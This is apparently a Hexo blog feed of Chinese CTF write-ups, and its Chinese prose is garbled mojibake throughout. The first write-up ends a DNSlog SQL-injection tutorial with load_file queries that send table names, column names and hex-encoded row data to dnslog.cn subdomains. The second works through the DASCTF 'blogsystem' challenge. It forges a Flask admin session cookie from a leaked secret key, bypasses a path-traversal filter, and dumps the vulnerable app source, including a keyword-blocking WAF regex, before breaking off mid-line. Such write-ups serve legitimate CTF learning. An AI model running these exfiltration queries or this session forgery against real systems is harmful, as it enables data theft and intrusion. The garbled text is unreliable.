·å°±å¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å»æ³¨å‡ºåº“åç­‰ï¼Œç„¶åæˆ‘åˆ›å»ºä¸€ä¸ªteståº“ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•å»æ³¨å…¥<br><img src="https://s1.ax1x.com/2022/12/28/zzxMZR.png" alt="zzxMZR.png"><br>ç„¶åå¯ä»¥çœ‹åˆ°å¾—åˆ°äº†teståº“å<br><img src="https://s1.ax1x.com/2022/12/28/zzxZzF.png" alt="zzxZzF.png"></p><h3 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a>è·å–è¡¨å</h3><p>æˆ‘ä»¬éœ€è¦æ›´æ”¹group_concatå‡½æ•°ä¸­çš„é»˜è®¤é€—å·åˆ†éš”ç¬¦ï¼Œåœ¨ä½¿ç”¨group_concatåˆå¹¶æŸ¥è¯¢æ—¶ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨ â€œ,â€ è¿æ¥æˆ‘ä»¬æŸ¥è¯¢åˆ°çš„æ¯å€¼ï¼Œä½†æ˜¯ç”±äº <code>, </code>åœ¨urlä¸­æ˜¯ä¸å…è®¸å‡ºç°çš„ï¼Œæ‰€ä»¥ä½¿ç”¨groupæŸ¥è¯¢åˆ°çš„å€¼å»è§£ææ—¶å€™ï¼Œmysqlå°±ä¼šè®¤ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªurlåœ°å€ï¼Œå°±ä¸ä¼šå‡ºç°è§£æçš„æ“ä½œï¼Œæ‰€ä»¥å°±æ²¡æ³•è·å–åˆ°å€¼ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ . (ç‚¹å·) ä¹Ÿå¯ä»¥ç”¨ _ (ä¸‹åˆ’çº¿)ï¼Œå»ºè®®çš„è¯ç”¨ç‚¹å¥½æ¯”è¾ƒå¥½ï¼Œé˜²æ­¢æ•°æ®åº“åº“åä¸­æœ¬èº«å­˜åœ¨ä¸‹åˆ’çº¿<br>è¿™é‡Œæˆ‘ç›´æ¥æŠŠè¯­å¥æ”¾å‡ºæ¥äº†ï¼Œæ˜¯çœŸçš„å®¹æ˜“æ•²é”™<br><code>select load_file(concat(&#39;//&#39;,(select group_concat(table_name separator  &#39;.&#39;)from information_schema.tables where table_schema=database()),&#39;.d07ib5.dnslog.cn/11.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/zzxEGT.png" alt="zzxEGT.png"><br>æŸ¥è¯¢åˆ°è¡¨å<br><img src="https://s1.ax1x.com/2022/12/28/zzxVRU.png" alt="zzxVRU.png"></p><h3 id="æŸ¥çœ‹å­—æ®µ"><a href="#æŸ¥çœ‹å­—æ®µ" class="headerlink" title="æŸ¥çœ‹å­—æ®µ"></a>æŸ¥çœ‹å­—æ®µ</h3><p><code>select load_file(concat(&#39;//&#39;,(select group_concat(column_name separator  &#39;.&#39;)from information_schema.columns where table_schema=database() and table_name=&#39;table1&#39;),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/zzxmM4.png" alt="zzxmM4.png"><br>æŸ¥è¯¢æˆåŠŸï¼ˆä¸­é€”æ¢äº†ä¸ªåŸŸåï¼‰<br><img src="https://s1.ax1x.com/2022/12/28/zzxnsJ.png" alt="zzxnsJ.png"></p><h3 id="æŸ¥çœ‹æ•°æ®"><a href="#æŸ¥çœ‹æ•°æ®" class="headerlink" title="æŸ¥çœ‹æ•°æ®"></a>æŸ¥çœ‹æ•°æ®</h3><p>å½“æˆ‘ä½¿ç”¨ä¸‹é¢è¯­å¥<code> select load_file(concat(&#39;//&#39;,(select group_concat(id,user,name separator  &#39;.&#39;)from table1),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code>æŸ¥è¯¢æ•°æ®å°±ä¼šå¤±æ•ˆï¼Œå› ä¸º<br>urlä¸­ä¼ é€’çš„å­—ç¬¦éå¸¸æœ‰é™ï¼Œå¾ˆå¤šç‰¹æ®Šå­—ç¬¦å¦‚ <code>&#123; , &#125; , ï¼</code>,æ˜¯æ— æ³•ä¼ é€’çš„ï¼Œè¿™å°±ä¼šå¯¼è‡´æˆ‘ä»¬çš„load_fileå‡½æ•°å¤±æ•ˆï¼Œè€Œåœ¨flagä¸­æ‹¬å·ä»€ä¹ˆçš„ä¼šç»å¸¸å‡ºç°ï¼Œæ‰€ä»¥ä½¿ç”¨hexè¿›è¡Œç¼–ç <br><code>select load_file(concat(&#39;//&#39;,(select hex(group_concat(id,user,name separator  &#39;.&#39;)) from table1),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/pSSptQU.png" alt="pSSptQU.png"><br>å¾—åˆ°<br><img src="https://s1.ax1x.com/2022/12/28/zzxuL9.png" alt="zzxuL9.png"><br>ç„¶åè§£ç å¾—åˆ°å­—æ®µæ•°æ®<br><img src="https://s1.ax1x.com/2022/12/28/zzxtQe.png" alt="zzxtQe.png"></p><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/monster663/article/details/113757235">æ·±åº¦å‰–æDNSLogæ³¨å…¥åŸç†&amp;æœ¬åœ°å®ä¾‹æµ‹è¯•_monster663çš„åšå®¢-CSDNåšå®¢_dnslogæ³¨å…¥åŸç†</a><br><a href="https://blog.csdn.net/king9666/article/details/106022050">DNSåŸç†åŠå…¶è§£æè¿‡ç¨‹_king9666çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://www.freebuf.com/articles/web/259023.html">DNSlogæ³¨å…¥è¯¦ç»†è§£æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF 2022åæœˆèµ› blogsystem</title>
      <link href="/2022/12/buu%E5%8D%81%E6%9C%88%E8%B5%9B-blogsystem/"/>
      <url>/2022/12/buu%E5%8D%81%E6%9C%88%E8%B5%9B-blogsystem/</url>
      
        <content type="html"><![CDATA[<p><strong>é¦–å…ˆå¾—æ„Ÿè°¢<a href="https://www.lengf233.top/">lengf</a>å¸ˆå‚…ç»™è§£ç­”ä¸€äº›å¾ˆå‚»çš„é—®é¢˜</strong></p><p>è¿™ä¸ªé¢˜åé¢æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ä¹‹å‰è¿˜æ²¡å­¦è¿‡ï¼Œå…ˆçœ‹çœ‹å§<br>è¿›å…¥é¢˜ç›®æ³¨å†Œä¸€ä¸ªè´¦å·å‘ç°adminå·²ç»è¢«æ³¨å†Œï¼Œè¿™é‡Œå°±è¦æƒ³åˆ°sessionä¼ªé€ ï¼Œä»¥adminç™»å½•<br>è¦ä¼ªé€ sessionå°±å¾—çŸ¥é“keyï¼Œåœ¨Blogè·¯ç”±çš„<code>flask åŸºç¡€æ€»ç»“</code>è¿™ç¯‡æ–‡ç« æ‰¾åˆ°key<br><img src="https://s1.ax1x.com/2022/12/27/zzBSnx.png" alt="zzBSnx.png"><br>ç„¶åç”¨å·¥å…·ä¼ªé€ <br><code>python flask_session_cookie_manager3.py encode -s 7his_1s_my_fav0rite_ke7 -t &quot;&#123;&#39;_permanent&#39;:True,&#39;username&#39;:&#39;admin&#39;&#125;&quot;</code><br>ä»¥adminç™»å½•ä¼šå‘ç°å¤šäº†ä¸€ä¸ªDownloadè·¯ç”±<br><img src="https://s1.ax1x.com/2022/12/27/zzBpB6.png" alt="zzBpB6.png"><br>ç‚¹è¿›å…¥æ˜¯ä¸€å¼ å›¾ç‰‡ï¼ŒæŠ“åŒ…ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œè¿™é‡Œæ˜¯ç”¨<code>.//./</code>ç»•è¿‡ï¼Œæºç è¿‡æ»¤æ–¹å¼ä¸º<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code><br><img src="https://s1.ax1x.com/2022/12/27/zzB9HK.png" alt="zzB9HK.png"><br>æºç åœ¨app&#x2F;app.py<br><img src="https://s1.ax1x.com/2022/12/27/zzBiND.png" alt="zzBiND.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">//app.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> config  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">app.config.from_object(config)  </span><br><span class="line">app.secret_key = <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span>  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> view <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">app.register_blueprint(index, name=<span class="string">&#x27;index&#x27;</span>)  </span><br><span class="line">app.register_blueprint(blog, name=<span class="string">&#x27;blog&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.context_processor  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_statue</span>():  </span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> username:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">            <span class="keyword">if</span> user:  </span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&#x27;name&#x27;</span>: user.name, <span class="string">&#x27;password&#x27;</span>: user.password&#125;  </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">            <span class="keyword">return</span> e  </span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¯¼å…¥æ¨¡å—åˆ¤æ–­æ˜¯MVTæ¶æ„ï¼Œæœç´¢ä¸€æ³¢</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp myweb</span><br><span class="line"></span><br><span class="line">è¿™å°†åˆ›å»ºä¸€ä¸ªç›®å½•mywebï¼Œå…¶ç›®å½•å¦‚ä¸‹ï¼šæ­¤ç›®å½•ç»“æ„å°†å®¹çº³è½®è¯¢åº”ç”¨ç¨‹åºã€‚</span><br><span class="line"></span><br><span class="line">[<span class="meta">root@localhost demo</span>]<span class="meta"># tree mysite/</span></span><br><span class="line">mysite/</span><br><span class="line">â”œâ”€â”€ manage.py</span><br><span class="line">â”œâ”€â”€ mysite</span><br><span class="line">â”‚   â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚   â”œâ”€â”€ settings.py</span><br><span class="line">â”‚   â”œâ”€â”€ urls.py</span><br><span class="line">â”‚   â””â”€â”€ wsgi.py</span><br><span class="line">â””â”€â”€ myweb</span><br><span class="line">    â”œâ”€â”€ admin.py</span><br><span class="line">    â”œâ”€â”€ apps.py</span><br><span class="line">    â”œâ”€â”€ __init__.py</span><br><span class="line">    â”œâ”€â”€ migrations</span><br><span class="line">    â”‚   â””â”€â”€ __init__.py</span><br><span class="line">    â”œâ”€â”€ models.py</span><br><span class="line">    â”œâ”€â”€ tests.py</span><br><span class="line">    â””â”€â”€ views.py</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶ç»“æ„ï¼Œç„¶åè¯»å–<code>view/__init__.py</code>å‘ç°åœ¨å…¶ä¸­åˆå¯¼å…¥äº†å…¶ä»–æ¨¡å—<br><img src="https://s1.ax1x.com/2022/12/27/zzBPAO.png" alt="zzBPAO.png"><br>æ¥ç€è¯»å–index.pyå’Œblog.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">//index.py</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, session, render_template, request, flash, redirect, url_for, Response, send_file  </span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> check_password_hash  </span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line">index = Blueprint(<span class="string">&quot;index&quot;</span>, __name__)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)  </span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  </span><br><span class="line">            flash(<span class="string">&quot;è¯¥ç”¨æˆ·åå·²å­˜åœ¨&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            user = User(username=username, name=name)  </span><br><span class="line">            user.password_hash(password)  </span><br><span class="line">            db.session.add(user)  </span><br><span class="line">            db.session.commit()  </span><br><span class="line">            flash(<span class="string">&quot;æ³¨å†ŒæˆåŠŸï¼&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)  </span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> (user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (check_password_hash(user.password, password)):  </span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username  </span><br><span class="line">            session.permanent = <span class="literal">True</span>  </span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flash(<span class="string">&quot;è´¦å·æˆ–å¯†ç é”™è¯¯&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&quot;/updatePwd&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@login_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">        lodPwd = request.form.get(<span class="string">&quot;lodPwd&quot;</span>)  </span><br><span class="line">        newPwd1 = request.form.get(<span class="string">&quot;newPwd1&quot;</span>)  </span><br><span class="line">        newPwd2 = request.form.get(<span class="string">&quot;newPwd2&quot;</span>)  </span><br><span class="line">        username = session.get(<span class="string">&quot;username&quot;</span>)  </span><br><span class="line">        user = User.query.<span class="built_in">filter</span>(User.username == username).first()  </span><br><span class="line">        <span class="keyword">if</span> check_password_hash(user.password, lodPwd):  </span><br><span class="line">            <span class="keyword">if</span> newPwd1 != newPwd2:  </span><br><span class="line">                flash(<span class="string">&quot;ä¸¤æ¬¡æ–°å¯†ç ä¸ä¸€è‡´ï¼&quot;</span>)  </span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                user.password_hash(newPwd2)  </span><br><span class="line">                db.session.commit()  </span><br><span class="line">                flash(<span class="string">&quot;ä¿®æ”¹æˆåŠŸï¼&quot;</span>)  </span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            flash(<span class="string">&quot;åŸå¯†ç é”™è¯¯ï¼&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;updatePwd.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="meta">@admin_limit  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():  </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):  </span><br><span class="line">        path = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        path = os.path.join(<span class="string">&#x27;static/upload/&#x27;</span>, path)  </span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):  </span><br><span class="line">            <span class="keyword">return</span> send_file(path)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>, file=path)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>,  </span><br><span class="line">                           yaml=<span class="string">&#x27;æ‰€è°“ã€æ¶ã€ï¼Œæ˜¯é‚£äº›åªä¸ºäº†è‡ªå·±ï¼Œåˆ©ç”¨å’Œè·µè¸å¼±è€…çš„å®¶ä¼™ï¼ä½†æ˜¯ï¼Œæˆ‘è™½ç„¶æ˜¯è¿™æ ·ï¼Œä¹ŸçŸ¥é“ä»€ä¹ˆæ˜¯ä»¤äººä½œå‘•çš„ã€æ¶ã€ï¼Œæ‰€ä»¥ï¼Œç”±æˆ‘æ¥åˆ¶è£ï¼&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@index.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():  </span><br><span class="line">    session.clear()  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index.hello&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">//blog.py</span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, render_template, request, session  </span><br><span class="line"><span class="keyword">from</span> yaml <span class="keyword">import</span> Loader  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> decorators <span class="keyword">import</span> login_limit, admin_limit  </span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">blog = Blueprint(<span class="string">&quot;blog&quot;</span>, __name__, url_prefix=<span class="string">&quot;/blog&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):  </span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):  </span><br><span class="line">        <span class="keyword">return</span> <span 